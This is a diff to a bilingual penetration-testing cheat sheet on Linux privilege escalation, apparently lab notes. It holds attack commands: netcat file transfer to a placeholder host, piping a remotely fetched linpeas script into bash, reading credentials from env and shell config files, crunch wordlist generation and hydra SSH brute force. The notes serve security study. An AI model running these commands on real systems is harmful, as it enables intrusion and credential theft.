@@ -176,11 +176,14 @@ strings /usr/bin/passwd_flag
 #### Transfert de fichiers avec nc
 
 ```bash
-# Cible : écouter (lancer en premier)
-nc -lvnp 4444 > fichier_reçu
+# On your receiver:
 
-# Kali : envoyer
-nc <ip_cible> 4444 < fichier_à_envoyer
+nc -l -p 1234 -q 1 > something.zip < /dev/null
+
+# On your sender:
+
+cat something.zip | netcat server.ip.here 1234
+
 ```
 
 #### unix-privesc-check
@@ -212,3 +215,57 @@ curl http://<ip>/linpeas.sh | bash
 wget http://<ip>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
 ./linpeas.sh > output.txt
 ```
+
+## Exposed confidential information
+
+### Inspecting user trails
+
+**Variables d'environnement**
+
+Parfois des credentials sont stockés dans des variables d'environnement (ex: scripts d'authentification custom).
+
+```bash
+env
+```
+
+**Fichiers de configuration shell**
+
+Vérifier si une variable suspecte trouvée dans `env` est persistante (définie dans `.bashrc`, `.bash_profile`, etc.).
+
+```bash
+cat ~/.bashrc
+cat ~/.bash_profile
+cat ~/.profile
+```
+
+**Escalade directe si credential trouvé**
+
+```bash
+su - root
+# ou
+su - <autre_user>
+```
+
+**Générer un wordlist dérivé d'un credential connu**
+
+Si on connaît un pattern (ex: `Lab` + 3 chiffres) :
+
+```bash
+# Kali
+crunch 6 6 -t Lab%%% > wordlist
+```
+
+**Brute force SSH avec Hydra**
+
+```bash
+# Kali
+hydra -l <user> -P wordlist <ip> -t 4 ssh
+```
+
+**Vérifier les droits sudo une fois connecté**
+
+```bash
+sudo -l
+sudo -i
+```
+
